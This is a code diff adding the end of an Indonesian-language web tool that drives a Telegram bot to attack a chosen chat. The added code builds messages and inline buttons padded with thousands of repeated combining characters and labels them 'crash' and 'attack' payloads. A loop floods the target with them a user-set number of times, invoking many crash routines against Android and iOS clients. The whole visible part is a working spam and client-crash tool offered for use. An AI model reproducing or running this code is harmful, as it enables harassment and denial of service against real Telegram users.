+    const KayX = " ҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈‌҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ" .repeat(3500); 
+    const textToSend = mention ? `${mention} ${KayX}` : KayX;
+
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: target,
+        text: textToSend
+      })
+    });
+    console.log("✅ Pesan panjang terkirim");
+  } catch (err) {
+    console.log("❌ Error kirim pesan panjang:", err.message);
+  }
+}
+
+async function CrashMedia(target) {
+  if (!botToken) {
+    alert("Token bot belum diatur.");
+    return;
+  }
+
+  try {
+    // 1. Kirim Foto
+    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: target,
+        photo: "https://files.catbox.moe/qhrfuz.jpg",
+        caption: "🩸 Foto Serangan 🩸"
+      })
+    });
+
+    // 2. Kirim Video
+    await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: target,
+        video: "https://files.catbox.moe/5e4h9j.mp4",
+        caption: "🎥 Video Serangan 🎥"
+      })
+    });
+
+    // 3. Kirim Pesan dengan Button “aneh” biar crash
+    const longText = "ꦽꦽꦽ".repeat(3500); // teks panjang tanpa helper
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: target,
+        text: "🩸 Button Crash Attack 🩸",
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: longText, url: "https://t.me/RannTzyBack2" }],
+            [{ text: "🧨 Crash 🧨", callback_data: longText }]
+          ]
+        }
+      })
+    });
+
+    console.log("✅ Foto, Video, dan Button crash terkirim");
+  } catch (err) {
+    console.log("❌ Error kirim:", err.message);
+  }
+}
+
+/* Fungsi mengirim spam pesan */
+async function sendSpam() {
+  if (!botToken) {
+    alert("Token bot belum diatur. Silakan tambah token terlebih dahulu.");
+    showPage("page1");
+    return;
+  }
+
+  const target = document.getElementById("targetId").value.trim();
+  const count = parseInt(document.getElementById("msgCount").value, 10);
+  const selected = document.getElementById("messageSelect").value;
+
+  if (!target || !count || !selected) {
+    alert("Isi semua kolom dan pilih fitur!");
+    return;
+  }
+
+  let sent = 0;
+  document.getElementById("consoleOutput").textContent = "";
+
+  for (let i = 0; i < count; i++) {
+    try {
+      // ===== CRASH UI =====
+      if (selected === "crash_ui") {
+        await sendCrashUI(target);      
+        await sendLocaCrashUI(target);
+        await sendUiCrash(target);
+        await sendLocaPayloadFc(target);
+        await sendDocuSql(target);
+        await XnXxUi(target);
+        await FcFastByUi(target);
+        await FolwareFunction(target);
+        await paradoxes(target);
+        await CrashMedia(target);
+        sent += 10;
+        continue;
+      }
+
+      // ===== CRASH IOS ===== (dibuat sama seperti CRASH UI)
+      if (selected === "crash_ios") {
+        await mediaBlast(target);
+        await mediaBlastWithButtons(target);
+        await BagTeleSticker(target);
+        await TestFankTele(target)
+        await MakLoeMention(target);
+        await TotalUltimateAttack(target);
+        await fuckgroup(target);
+        await OtaSpamNotif(target);
+        await DelayWithUi(target, true);
+        await robustfreeze(target);
+        await FloodsCarousel2(target);
+        sent += 11;
+        continue;
+      }
+
+      // ===== Default (pesan biasa) =====
+      const message = getCrashIOSMessage(); // fallback
+      const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: target, text: message }),
+      });
+
+      const data = await res.json();
+
+      if (data.ok) {
+        sent++;
+        document.getElementById("consoleOutput").textContent += `[${i + 1}] Pesan terkirim.\n`;
+      } else {
+        document.getElementById("consoleOutput").textContent += `[${i + 1}] Gagal: ${data.description}\n`;
+      }
+
+    } catch (e) {
+      document.getElementById("consoleOutput").textContent += `[${i + 1}] Error: ${e.message}\n`;
+    }
+  }
+
+  document.getElementById("consoleOutput").textContent += 
+    `✅ Berhasil kirim ${sent} pesan (${count}x loop).`;
+}
+
+/* Fungsi untuk menampilkan halaman */
+function showPage(id) {
+  if (!loggedInUser && id !== "pageLogin" && id !== "pageRegister") {
+    alert("Silakan login terlebih dahulu!");
+    id = "pageLogin";
+  }
+  document.querySelectorAll(".page").forEach(p => (p.style.display = "none"));
+  const el = document.getElementById(id);
+  if (el) el.style.display = "flex";
+  closeNav();
+}
+
+/* Sidebar open/close */
+function openNav() {
+  document.getElementById("mySidebar").style.width = "250px";
+}
+function closeNav() {
+  document.getElementById("mySidebar").style.width = "0";
+}
+
+/* Update tampilan welcome dashboard */
+function updateDashboardWelcome() {
+  const dashWelcome = document.getElementById("dashboardWelcome");
+  if (isAdmin) {
+    dashWelcome.textContent = `Selamat datang Admin ${loggedInUser}! Anda memiliki akses penuh.`;
+  } else {
+    dashWelcome.textContent = `Selamat datang ${loggedInUser}! Nikmati fitur yang tersedia.`;
+  }
+}
+
+/* Update info last login */
+function updateLastLoginUI(lastLogin) {
+  const now = new Date();
+  const last = new Date(lastLogin);
+  const sidebarEl = document.getElementById("lastLoginSidebar");
+  const topUserEl = document.getElementById("userInfoTop");
+
+  sidebarEl.textContent = `Last Login: ${lastLogin}`;
+  sidebarEl.style.display = "block";
+
+  const isToday = last.toDateString() === now.toDateString();
+  if (isToday) {
+    sidebarEl.style.color = "limegreen";
+    sidebarEl.classList.remove("blink");
+  } else {
+    sidebarEl.style.color = "gold";
+    sidebarEl.classList.add("blink");
+  }
+
+  if (loggedInUser) {
+    topUserEl.textContent = `Halo, ${loggedInUser}` + (isAdmin ? " (Admin)" : "");
+    topUserEl.style.display = "block";
+  }
+}
+
+/* Logout function */
+function logout() {
+  loggedInUser = "";
+  isAdmin = false;
+  botToken = "";
+  localStorage.removeItem("loggedInUser");
+  localStorage.removeItem("lastLogin");
+  localStorage.removeItem("isAdmin");
+  localStorage.removeItem("botToken");
+
+  document.getElementById("menuButton").style.display = "none";
+  document.getElementById("userInfoTop").style.display = "none";
+  document.getElementById("sidebarUser").textContent = "Login: -";
+  document.getElementById("lastLoginSidebar").style.display = "none";
+
+  closeNav();
+  showPage("pageLogin");
+}
+
+/* Developer button */
+function openDeveloper() {
+  window.open("https://t.me/suikatkk", "_blank");
+}
+
+/* Init */
+window.addEventListener("load", () => {
+  const savedUser = localStorage.getItem("loggedInUser");
+  const lastLogin = localStorage.getItem("lastLogin");
+
+  updateTokenInputUI();
+
+  if (savedUser) {
+    loggedInUser = savedUser;
+    isAdmin = savedUser === "admin";
+
+    document.getElementById("menuButton").style.display = "block";
+    document.getElementById("userInfoTop").textContent =
+      `Halo, ${loggedInUser}` + (isAdmin ? " (Admin)" : "");
+    document.getElementById("userInfoTop").style.display = "block";
+    document.getElementById("sidebarUser").textContent =
+      `Login: ${loggedInUser}` + (isAdmin ? " (Admin)" : "");
+
+    if (lastLogin) updateLastLoginUI(lastLogin);
+
+    updateDashboardWelcome();
+    showPage("pageDashboard");
+  } else {
+    showPage("pageLogin");
+  }
+});
+</script>
+</body>
+</html>
